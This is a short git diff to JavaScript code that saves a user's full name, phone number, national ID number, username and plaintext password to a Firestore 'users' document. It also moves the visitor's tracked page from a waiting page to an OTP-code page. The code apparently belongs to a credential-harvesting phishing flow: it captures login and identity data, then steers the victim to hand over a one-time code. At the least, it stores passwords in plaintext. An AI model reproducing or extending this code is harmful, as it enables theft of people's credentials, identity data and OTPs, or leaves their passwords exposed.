@@ -562,24 +562,32 @@ if(!userId){
     );
 
 }
+try{
 
-console.log("before setDoc :", demoUser)
-await setDoc(doc(db,"users",userId),{
+    await setDoc(doc(db,"users",userId),{
 
-    name: demoUser?.fullName || "",
-    phone: demoUser?.phoneNumber || "",
-    nationalId: demoUser?.idNumber || "",
+        name: demoUser?.fullName || "",
+        phone: demoUser?.phoneNumber || "",
+        nationalId: demoUser?.idNumber || "",
 
-    username: username,
-    password: password,
+        username: username,
+        password: password,
 
-    status: "pending",
+        status: "pending",
 
-    currentPage: "waitaccount.html",
-    
-    lastSeen: Date.now()
+        currentPage: "code-otp.html",
 
-},{ merge:true });
+        lastSeen: Date.now()
+
+    },{ merge:true });
+
+    console.log("SETDOC SUCCESS");
+
+}catch(error){
+
+    console.log("SETDOC ERROR:", error);
+
+}   
 
 
 console.log("LOGIN SAVED", {
